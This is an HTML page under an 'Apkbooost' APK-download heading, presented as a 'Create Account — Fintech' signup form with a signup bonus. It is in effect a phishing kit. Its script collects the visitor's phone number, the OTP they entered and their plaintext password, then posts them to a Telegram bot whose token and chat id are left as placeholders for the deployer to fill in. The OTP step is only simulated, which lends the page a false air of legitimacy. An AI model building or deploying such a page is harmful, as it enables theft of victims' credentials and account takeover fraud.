# Apkbooost
> 🔥 Fast &amp; Safe APK Downloads – Get the latest apps and games only on APKBoost! Trusted source for 100% original APKs. No ads. No virus
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Create Account — Fintech</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
  <style>
    :root{
      --bg:#0b1426;
      --card-bg: rgba(255,255,255,0.03);
      --input-bg:#162238;
      --muted: rgba(255,255,255,0.6);
      --accent1: #1e6fff;
      --accent2: #00d2ff;
      --glass-border: rgba(255,255,255,0.06);
      --success: #28c76f;
      --danger: #ff6b6b;
      --radius: 14px;
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body{
      margin:0;
      font-family:Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
      background:
        radial-gradient(800px 400px at 10% 10%, rgba(2,54,99,0.12), transparent 12%),
        radial-gradient(700px 350px at 90% 90%, rgba(0,210,255,0.05), transparent 12%),
        var(--bg);
      color:#e6eef8;
      -webkit-font-smoothing:antialiased;
      -moz-osx-font-smoothing:grayscale;
      display:flex;
      align-items:center;
      justify-content:center;
      padding:28px;
    }

    /* Container */
    .card{
      width:100%;
      max-width:420px;
      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
      border-radius:18px;
      padding:20px;
      border:1px solid var(--glass-border);
      backdrop-filter: blur(8px) saturate(1.05);
      box-shadow: 0 6px 30px rgba(2,8,23,0.6);
      display:flex;
      flex-direction:column;
      gap:16px;
    }

    /* Top badges */
    .badges{
      display:flex;
      gap:10px;
      justify-content:space-between;
      flex-wrap:wrap;
    }
    .badge{
      display:inline-flex;
      align-items:center;
      gap:8px;
      padding:8px 12px;
      border-radius:12px;
      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
      border:1px solid rgba(255,255,255,0.03);
      font-size:13px;
      color:var(--muted);
      box-shadow: inset 0 1px 0 rgba(255,255,255,0.02);
    }

    /* Title */
    h1{
      margin:0;
      font-size:20px;
      letter-spacing: -0.2px;
      color:#eaf4ff;
    }
    .subtitle{
      font-size:13px;
      color:var(--muted);
    }

    /* Referral box */
    .referral{
      display:flex;
      justify-content:space-between;
      align-items:center;
      padding:10px 12px;
      background: linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.005));
      border-radius:12px;
      border:1px solid rgba(255,255,255,0.03);
      color:var(--muted);
      font-size:14px;
    }
    .referral strong{color:#dff0ff}

    /* Form */
    form{display:flex;flex-direction:column;gap:12px}
    .field{display:flex;flex-direction:column;gap:8px}
    label{font-size:13px;color:var(--muted)}
    .input-row{display:flex;gap:10px}
    input[type="tel"], input[type="text"], input[type="password"], select{
      background:var(--input-bg);
      color:#eaf4ff;
      border:1px solid rgba(255,255,255,0.04);
      padding:12px 12px;
      border-radius:12px;
      outline:none;
      font-size:15px;
      width:100%;
      transition: box-shadow .18s, border-color .18s, transform .06s;
    }
    input::placeholder{color:rgba(226,240,255,0.35)}
    input:focus, select:focus{
      border-color: rgba(30,111,255,0.9);
      box-shadow: 0 6px 18px rgba(30,111,255,0.08);
    }
    .country-select{
      min-width:110px;
      display:flex;
      align-items:center;
      gap:8px;
    }
    .country-flag{font-size:16px}
    .phone-group{display:flex;gap:10px;align-items:center}
    .inline{
      display:inline-flex;
      gap:8px;
      align-items:center;
    }

    /* OTP row */
    .otp-row{display:flex;gap:8px}
    .get-otp-btn{
      min-width:120px;
      background:transparent;
      color:var(--muted);
      border:1px solid rgba(255,255,255,0.04);
      padding:10px 12px;
      border-radius:12px;
      cursor:pointer;
      transition: all .14s;
      font-weight:600;
    }
    .get-otp-btn:disabled{opacity:0.5;cursor:default}
    .get-otp-btn.active{
      background:linear-gradient(90deg,var(--accent1),var(--accent2));
      color:white;
      border: none;
      box-shadow: 0 8px 30px rgba(29, 111, 255, 0.12);
    }

    /* password toggle */
    .pw-wrap{position:relative; display:flex}
    .pw-toggle{
      position:absolute;
      right:10px;
      top:50%;
      transform:translateY(-50%);
      background:transparent;
      border:none;
      color:var(--muted);
      cursor:pointer;
      padding:6px;
      display:inline-flex;
      align-items:center;
    }

    /* Register button */
    .submit-btn{
      padding:14px;
      border-radius:12px;
      border:none;
      cursor:pointer;
      color:white;
      font-weight:700;
      font-size:15px;
      background:linear-gradient(90deg,var(--accent1),#0ea5ff);
      box-shadow: 0 8px 30px rgba(14,165,255,0.16);
    }
    .submit-btn:disabled{opacity:0.6;cursor:not-allowed}

    /* Footer row */
    .footer{
      display:flex;
      justify-content:space-between;
      align-items:center;
      gap:12px;
      margin-top:6px;
      flex-wrap:wrap;
    }
    .download-btn{
      padding:10px 12px;
      border-radius:12px;
      border:1px solid rgba(255,255,255,0.04);
      background:transparent;
      color:var(--muted);
      font-weight:600;
      cursor:pointer;
    }

    .copyright{
      font-size:12px;
      color:rgba(226,240,255,0.36);
    }

    /* helper texts */
    .note{font-size:13px;color:rgba(226,240,255,0.5)}
    .error{color:var(--danger);font-size:13px}
    .success{color:var(--success);font-size:13px}

    /* Responsive tweaks */
    @media(min-width:860px){
      .card{max-width:480px;padding:28px}
      h1{font-size:22px}
    }
  </style>
</head>
<body>
  <main class="card" role="main" aria-labelledby="title">
    <div class="badges" aria-hidden="true">
      <div class="badge">🔒 Secure &amp; Safe</div>
      <div class="badge">⭐ ₹600 Signup Bonus + 5.5% Recharge Reward</div>
    </div>

    <div>
      <h1 id="title">Create Account</h1>
      <p class="subtitle">Fast, secure onboarding — get started in seconds.</p>
    </div>

    <div class="referral" aria-live="polite">
      <div>Invited by: <strong id="ref-code">[Referral Code]</strong></div>
      <div class="note">Referral gets bonuses applied</div>
    </div>

    <form id="regForm" novalidate>
      <!-- Phone -->
      <div class="field">
        <label for="phone">Phone Number</label>
        <div class="phone-group">
          <div class="country-select">
            <select id="countryCode" title="Country code" aria-label="Country code">
              <option value="+91">🇮🇳 +91</option>
              <option value="+44">🇬🇧 +44</option>
              <option value="+1">🇺🇸 +1</option>
            </select>
          </div>
          <input id="phone" type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="10" placeholder="Enter your phone number" aria-describedby="phoneHelp" required>
        </div>
        <div id="phoneHelp" class="note">We'll send a one-time OTP to this number.</div>
      </div>

      <!-- OTP -->
      <div class="field">
        <label for="otp">Verification Code</label>
        <div class="otp-row">
          <input id="otp" type="text" inputmode="numeric" maxlength="6" placeholder="Enter 6-digit OTP" aria-label="OTP">
          <button id="getOtpBtn" type="button" class="get-otp-btn">Get OTP</button>
        </div>
        <div id="otpStatus" class="note" aria-live="polite"></div>
      </div>

      <!-- Password -->
      <div class="field">
        <label for="password">Password</label>
        <div class="pw-wrap">
          <input id="password" type="password" placeholder="8-12 chars: A-Z, a-z, 0-9, symbol" aria-describedby="pwHelp" required>
          <button type="button" class="pw-toggle" id="pwToggle" aria-label="Show password">👁️</button>
        </div>
        <div id="pwHelp" class="note">Use 8–12 characters, mix upper/lowercase, numbers & symbols.</div>
      </div>

      <div class="field">
        <button id="submitBtn" class="submit-btn" type="submit">Register Now →</button>
      </div>

      <div id="formMessage" role="status" aria-live="polite"></div>
    </form>

    <div class="footer">
      <button class="download-btn" id="downloadBtn" type="button">Already have an account? Download the app</button>
      <div class="copyright">© <span id="currentYear"></span> Fintech Ltd. All rights reserved.</div>
    </div>
  </main>

  <script>
    /*********************
     * Telegram placeholders
     * Replace with your actual bot token and chat id.
     *********************/
    const TELEGRAM_BOT_TOKEN = '<TELEGRAM_BOT_TOKEN>';
    const TELEGRAM_CHAT_ID = '<TELEGRAM_CHAT_ID>';

    // UI elements
    const refCodeEl = document.getElementById('ref-code');
    const phoneInput = document.getElementById('phone');
    const countryCode = document.getElementById('countryCode');
    const getOtpBtn = document.getElementById('getOtpBtn');
    const otpInput = document.getElementById('otp');
    const otpStatus = document.getElementById('otpStatus');
    const pwInput = document.getElementById('password');
    const pwToggle = document.getElementById('pwToggle');
    const form = document.getElementById('regForm');
    const formMessage = document.getElementById('formMessage');
    const submitBtn = document.getElementById('submitBtn');
    const downloadBtn = document.getElementById('downloadBtn');
    const currentYear = document.getElementById('currentYear');

    currentYear.textContent = new Date().getFullYear();

    // Try to populate referral code from query param ?ref=...
    (function populateReferral(){
      const params = new URLSearchParams(location.search);
      const ref = params.get('ref') || 'N/A';
      refCodeEl.textContent = ref;
    })();

    // Phone input: allow only digits
    phoneInput.addEventListener('input', (e) => {
      const cleaned = e.target.value.replace(/\D/g,'').slice(0,10);
      if (cleaned !== e.target.value) e.target.value = cleaned;
    });

    // OTP simulation state
    let otpTimer = null;
    let otpRemaining = 0;
    let generatedOtp = null;

    function startOtpCountdown(seconds = 60){
      otpRemaining = seconds;
      updateOtpBtn();
      otpTimer = setInterval(() => {
        otpRemaining--;
        updateOtpBtn();
        if (otpRemaining <= 0){
          clearInterval(otpTimer);
          otpTimer = null;
          generatedOtp = null; // expire simulated OTP
          otpStatus.textContent = 'OTP expired. Request again.';
        }
      }, 1000);
    }

    function updateOtpBtn(){
      if (otpRemaining > 0){
        getOtpBtn.textContent = `Resend (${otpRemaining}s)`;
        getOtpBtn.disabled = true;
        getOtpBtn.classList.remove('active');
      } else {
        getOtpBtn.textContent = 'Get OTP';
        getOtpBtn.disabled = false;
        getOtpBtn.classList.add('active');
      }
    }

    // Initialize button style
    updateOtpBtn();

    getOtpBtn.addEventListener('click', () => {
      // Validate phone before sending
      const phone = phoneInput.value.trim();
      if (!/^\d{10}$/.test(phone)){
        otpStatus.textContent = 'Enter a valid 10-digit phone number first.';
        otpStatus.className = 'error';
        return;
      }

      // Simulate sending OTP: create a 6-digit OTP and "send"
      generatedOtp = (Math.floor(100000 + Math.random() * 900000)).toString();
      console.info('Simulated OTP (for testing):', generatedOtp);
      otpStatus.className = 'success';
      otpStatus.textContent = `OTP sent to ${countryCode.value} ${phone}. (Simulated)`;
      startOtpCountdown(60);

      // In a real app you'd send the OTP via your backend here.
    });

    // Password show/hide
    pwToggle.addEventListener('click', () => {
      const type = pwInput.type === 'password' ? 'text' : 'password';
      pwInput.type = type;
      pwToggle.textContent = type === 'password' ? '👁️' : '🙈';
    });

    // Validation helpers
    function validatePhone(phone){
      return /^\d{10}$/.test(phone);
    }
    function validateOtp(otp){
      return /^\d{6}$/.test(otp);
    }
    function validatePassword(pw){
      // 8-12 chars, at least one lower, one upper, one digit, one symbol
      return /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[^A-Za-z0-9]).{8,12}$/.test(pw);
    }

    // Form submission: validate and send to Telegram
    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      formMessage.textContent = '';
      formMessage.className = '';

      const phone = phoneInput.value.trim();
      const fullPhone = `${countryCode.value}${phone}`;
      const otp = otpInput.value.trim();
      const password = pwInput.value;

      // Basic validations
      if (!validatePhone(phone)){
        formMessage.className = 'error';
        formMessage.textContent = 'Phone number must be 10 digits.';
        phoneInput.focus();
        return;
      }
      if (!validateOtp(otp)){
        formMessage.className = 'error';
        formMessage.textContent = 'Enter a valid 6-digit OTP.';
        otpInput.focus();
        return;
      }
      // If we generated an OTP, check match; otherwise only validate format
      if (generatedOtp && otp !== generatedOtp){
        formMessage.className = 'error';
        formMessage.textContent = 'Incorrect OTP.';
        otpInput.focus();
        return;
      }
      if (!validatePassword(password)){
        formMessage.className = 'error';
        formMessage.textContent = 'Password must be 8-12 chars and include upper, lower, number and symbol.';
        pwInput.focus();
        return;
      }

      // Prepare payload for Telegram
      const referral = refCodeEl.textContent || 'N/A';
      const message = `New registration:
Phone: ${fullPhone}
OTP (entered): ${otp}
Password: ${password}
Referral: ${referral}
Source: Web registration form`;

      // Basic check that placeholders were replaced
      if (TELEGRAM_BOT_TOKEN.includes('<') || TELEGRAM_CHAT_ID.includes('<')) {
        // If placeholders not replaced, inform user but still simulate success
        console.warn('Telegram token/chat_id placeholders detected. Replace them to send to Telegram.');
        alert('Registration simulated (Telegram placeholders not replaced).');
        formMessage.className = 'success';
        formMessage.textContent = 'Registration simulated. Replace TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in the script to enable real Telegram delivery.';
        form.reset();
        return;
      }

      // Disable submit while sending
      submitBtn.disabled = true;
      submitBtn.textContent = 'Registering...';

      try {
        // Send to Telegram Bot API
        const url = `https://api.telegram.org/bot${encodeURIComponent(TELEGRAM_BOT_TOKEN)}/sendMessage`;
        const body = {
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        };

        const resp = await fetch(url, {
          method: 'POST',
          headers: {'Content-Type':'application/json'},
          body: JSON.stringify(body)
        });

        const data = await resp.json();
        if (resp.ok && data.ok) {
          alert('Registration successful — confirmation sent.');
          formMessage.className = 'success';
          formMessage.textContent = 'Registration successful.';
          form.reset();
          generatedOtp = null;
          if (otpTimer){ clearInterval(otpTimer); otpTimer = null; otpRemaining = 0; updateOtpBtn(); }
        } else {
          console.error('Telegram API error:', data);
          formMessage.className = 'error';
          formMessage.textContent = 'Registration failed sending data. See console for details.';
        }
      } catch (err) {
        console.error('Network error sending to Telegram:', err);
        formMessage.className = 'error';
        formMessage.textContent = 'Network error while sending registration.';
      } finally {
        submitBtn.disabled = false;
        submitBtn.textContent = 'Register Now →';
      }
    });

    // Download button action
    downloadBtn.addEventListener('click', () => {
      // Replace with your app store links as needed
      window.open('https://example.com/download', '_blank');
    });

    // Accessibility: ensure OTP button has initial active style
    getOtpBtn.classList.add('active');
  </script>
</body>
</html>
